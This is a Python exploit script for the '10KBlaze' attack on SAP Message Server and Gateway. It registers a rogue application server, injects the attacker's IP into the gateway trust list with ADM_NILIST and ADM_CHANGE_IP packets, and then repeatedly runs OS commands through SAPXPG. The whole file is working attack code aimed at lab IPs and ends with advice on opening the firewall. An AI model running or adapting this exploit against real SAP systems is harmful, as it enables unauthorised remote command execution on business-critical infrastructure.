#!/usr/bin/env python3
"""
test_direct_inject.py — Inject NILIST trust directly over the MS connection.

Instead of waiting for the pull-model TCP callback (which requires inbound
connections and hits the UFW firewall), we proactively send:
  1. ADM_NILIST (0x07)    — direct "trust this IP" injection to MS/GW
  2. ADM_CHANGE_IP (0x09) — update our registered IP; MS includes it in next
                             GW NILIST broadcast

Both go outbound over the existing MS registration socket — no inbound TCP needed.
After sending, we try SAPXPG at 5s, 15s, 30s, 60s intervals.
"""

import sys, socket, time, random, string
sys.path.insert(0, '/home/joris/Desktop/CLAUDE/SAPMAP')

from sap_ms_betrusted import (
    pkt_login_2, pkt_mod_state, pkt_adm, pkt_logout,
    adm_nilist_record, adm_change_ip_record,
    build_dp_info, ms_parse_header,
    ni_send, ni_recv, ni_try_recv,
    DP_VERSION_V13, FLAG_ADMIN,
    MSG_DIA, MSG_DIA_ENQ,
)
from sap_gw_xpg_standalone import (
    build_p1, build_p2, build_p3, build_p4,
    parse_response, ni_send as gw_send, ni_recv as gw_recv, ni_drain,
    hexdump, extract_p4_output,
)

MS_HOST  = '192.168.2.209'
MS_PORT  = 3901
GW_HOST  = '192.168.2.209'
GW_PORT  = 3300
ATT_IP   = '192.168.2.210'
SID      = 'S4H'
INST     = 0
HOSTNAME = 's4hanadev'
KERNEL   = '793_REL'
DEST     = 'T_75'
CLIENT   = '000'
COMMAND  = 'id'
TIMEOUT  = 20


def run_sapxpg():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)
    try:
        sock.connect((GW_HOST, GW_PORT))
    except socket.error as e:
        print(f"  [XPG] connect failed: {e}"); return False

    local_ip = sock.getsockname()[0]
    gw_send(sock, build_p1(GW_HOST, str(INST).zfill(2)))
    try:
        resp = gw_recv(sock, TIMEOUT); frames = [resp] + ni_drain(sock, 1)
    except socket.timeout:
        print("  [XPG] P1 timeout"); sock.close(); return False
    for f in frames:
        if parse_response(f)["error"]:
            print("  [XPG] P1 rejected"); sock.close(); return False

    p2 = build_p2(GW_HOST, DEST, local_ip=local_ip, target_hostname=HOSTNAME)
    gw_send(sock, p2)
    conv_id = None; gw_id = 0
    try:
        resp = gw_recv(sock, TIMEOUT); frames = [resp] + ni_drain(sock, 1)
        for f in frames:
            info = parse_response(f)
            if info["error"]:
                msg = info.get('error_msg', '')
                print(f"  [XPG] P2 rejected: {msg}"); sock.close(); return False
            if info["conv_id"] and not conv_id: conv_id = info["conv_id"]
            if info.get("gw_id") is not None: gw_id = info["gw_id"]
    except socket.timeout:
        print("  [XPG] P2 timeout"); sock.close(); return False
    if not conv_id:
        print("  [XPG] P2: no conv_id"); sock.close(); return False
    print(f"  [XPG] P2 OK conv_id={conv_id}")

    p3 = build_p3(conv_id, GW_HOST, HOSTNAME, SID, str(INST).zfill(2),
                  KERNEL, DEST, CLIENT, COMMAND, '', gw_id=gw_id)
    gw_send(sock, p3)
    try:
        resp = gw_recv(sock, TIMEOUT); frames = [resp] + ni_drain(sock, 1)
    except socket.timeout:
        print("  [XPG] P3 timeout"); sock.close(); return False

    p3_out = []
    for f in frames:
        info = parse_response(f)
        if info["error"]:
            print(f"  [XPG] P3 error: {info.get('error_msg','')}"); sock.close(); return False
        p3_out.extend(extract_p4_output(f))
    if p3_out:
        print("  [XPG] *** COMMAND OUTPUT ***")
        for ln in p3_out: print(f"    {ln}")
        sock.close(); return True

    p4 = build_p4(conv_id, GW_HOST, HOSTNAME, SID, str(INST).zfill(2),
                  KERNEL, DEST, CLIENT, gw_id=gw_id)
    gw_send(sock, p4)
    try:
        resp = gw_recv(sock, TIMEOUT); info = parse_response(resp)
        if info["error"]:
            print(f"  [XPG] P4 error: {info.get('error_msg','')}"); sock.close(); return False
        out = extract_p4_output(resp)
        if out:
            print("  [XPG] *** COMMAND OUTPUT ***")
            for ln in out: print(f"    {ln}")
            sock.close(); return True
        print("  [XPG] P4 OK but no output")
    except socket.timeout:
        print("  [XPG] P4 timeout")
    sock.close(); return False


def register_and_inject():
    suffix = ''.join(random.choices('0123456789abcdef', k=4))
    our_name = f'192_168_2_210_{SID}_{str(INST).zfill(2)}_{suffix}'
    print(f"[*] Registering as '{our_name}'...")

    ms = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ms.settimeout(15)
    ms.connect((MS_HOST, MS_PORT))

    # LOGIN_2
    ni_send(ms, pkt_login_2(our_name))
    resp = ni_recv(ms, 10)
    hdr = ms_parse_header(resp)
    key = hdr.get("key", b'\x00' * 8)
    print(f"[+] Logged in, key={key.hex()}")

    # MOD_STATE START  (msgtype=MSG_DIA_ENQ=0x05)
    dp = build_dp_info(our_name, INST, DP_VERSION_V13, ATT_IP)
    ni_send(ms, pkt_mod_state(our_name, key, MSG_DIA_ENQ, dp))
    r = ni_try_recv(ms, 3)
    if r: print(f"[*] MOD_STATE START resp: {r[:12].hex()}")

    # MOD_STATE ACTIVE (msgtype=MSG_DIA=0x01)
    ni_send(ms, pkt_mod_state(our_name, key, MSG_DIA, dp))
    r = ni_try_recv(ms, 3)
    if r: print(f"[*] MOD_STATE ACTIVE resp: {r[:12].hex()}")
    print(f"[+] Registration complete — {ATT_IP} in MS server table")

    time.sleep(0.5)

    # Build injection packets
    nilist_pkt  = pkt_adm(our_name, key, [adm_nilist_record(ATT_IP, kernel_new=True)])
    change_pkt  = pkt_adm(our_name, key, [adm_change_ip_record(ATT_IP, '0.0.0.0')])

    def inject():
        print(f"[*] ADM_NILIST  (0x07) → injecting {ATT_IP} into GW trust list")
        ni_send(ms, nilist_pkt)
        print(f"[*] ADM_CHANGE_IP (0x09) → triggering MS NILIST broadcast to GW")
        ni_send(ms, change_pkt)
        # Drain any responses
        ms.settimeout(2)
        for _ in range(5):
            r = ni_try_recv(ms, 2)
            if not r: break
            print(f"[*] MS ack: {r[:24].hex()}")
        ms.settimeout(15)

    inject()

    for wait, label in [(5, '5s'), (10, '10s'), (15, '15s'), (30, '30s'), (60, '60s')]:
        actual = wait if label == '5s' else wait - [0,5,10,15,30][['5s','10s','15s','30s','60s'].index(label)]
        print(f"\n[*] Waiting {actual}s → SAPXPG at t={label}...")
        time.sleep(actual)
        ok = run_sapxpg()
        if ok:
            print(f"\n[!!!] 10KBlaze EXPLOIT SUCCEEDED at t={label}")
            ms.close(); return True
        # Re-inject every 15s
        if label in ('10s', '30s'):
            inject()

    ms.close()
    return False


if __name__ == '__main__':
    print("=" * 60)
    print(" 10KBlaze direct-inject test (no inbound TCP needed)")
    print("=" * 60)
    ok = register_and_inject()
    if not ok:
        print("\n[*] Direct injection failed.")
        print("[*] Check gw/acl_mode on SAP system — if = 1, NILIST pull")
        print("[*] model is required, meaning inbound TCP must be allowed:")
        print("[*]   sudo ufw allow from 192.168.2.209 to any")
